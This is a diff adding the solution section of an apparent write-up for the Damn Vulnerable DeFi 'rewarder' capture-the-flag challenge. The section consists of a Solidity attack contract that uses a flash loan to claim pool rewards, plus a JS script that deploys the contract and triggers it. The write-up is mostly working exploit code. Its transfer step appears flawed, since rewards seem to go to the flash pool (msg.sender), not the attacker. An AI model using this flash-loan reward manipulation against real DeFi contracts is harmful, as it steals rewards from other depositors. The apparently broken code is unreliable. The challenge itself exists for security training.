@@ -305,3 +305,62 @@ By the way, rumours say a new pool has just launched. Isn’t it offering flash 
 
 # Subverting
 
+```solidity
+pragma solidity ^0.8.0;
+
+interface IDVT{
+    function transfer(address _recipient, uint256 _amount)external returns (bool);
+    function approve(address _spender, uint256 _amount) external returns (bool);
+}
+
+interface IRewarderPool{
+    function deposit(uint256 _amount) external;
+    function withdraw(uint256 _amount) external;
+}
+
+interface IRewardToken{
+    function transfer(address _recipient, uint256 _amount)external returns (bool);
+    function balanceOf(address _user) external view returns (uint256);
+}
+
+interface IFlashLoanerPool{
+    function flashLoan(uint256 amount) external;
+}
+contract AttackTheRewarder{
+
+    IRewarderPool rewarderPool;
+    IRewardToken rewardToken;
+    IFlashLoanerPool flashPool;
+    IDVT DVTtoken;
+
+    constructor(address _rewarderPool, address _rewardToken, address _flashPool, address _DVTtoken){
+        rewarderPool = IRewarderPool(_rewarderPool);
+        rewardToken = IRewardToken(_rewardToken);
+        flashPool = IFlashLoanerPool(_flashPool);
+        DVTtoken = IDVT(_DVTtoken);
+    }
+
+    function attack(uint _amount) external{
+        flashPool.flashLoan(_amount);
+    }
+
+    function receiveFlashLoan(uint256 _amount)  external payable{
+        DVTtoken.approve(address(rewarderPool), _amount);
+        rewarderPool.deposit(_amount);
+        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
+        rewarderPool.withdraw(_amount);
+        DVTtoken.transfer(address(flashPool), _amount);
+    }
+
+}
+```
+
+```js
+const AttackFactory = await ethers.getContractFactory('AttackTheRewarder', deployer);
+attack = await AttackFactory.deploy(rewarderPool.address,rewardToken.address,flashLoanPool.address,liquidityToken.address);
+await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+await attack.connect(player).attack(TOKENS_IN_LENDER_POOL);
+```
+
+![image](https://github.com/wasny0ps/Damn-Vulnerable-DeFi/assets/87646106/fb8a0bfb-71fe-4d84-847b-8d4e060aed43)
+
